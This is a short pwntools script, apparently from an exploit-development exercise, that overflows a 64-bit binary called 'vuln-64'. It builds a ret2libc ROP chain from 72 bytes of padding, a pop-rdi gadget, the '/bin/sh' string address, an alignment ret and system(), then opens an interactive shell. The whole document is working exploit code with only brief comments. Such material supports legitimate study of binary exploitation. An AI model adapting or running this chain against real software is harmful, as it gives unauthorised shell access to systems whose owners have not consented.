# 64-bit
from pwn import *

elf = context.binary = ELF('./vuln-64')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0x7ffff7dca000          # Set base address

rdi_pop=libc.address+0x27c65

ret=libc.address+0x27c66


system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 72         # The padding
payload += p64(rdi_pop)
payload += p64(binsh)       
payload += p64(ret)         #fix stack alignment
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

write('payload',payload)
p.clean()
p.sendline(payload)
p.interactive()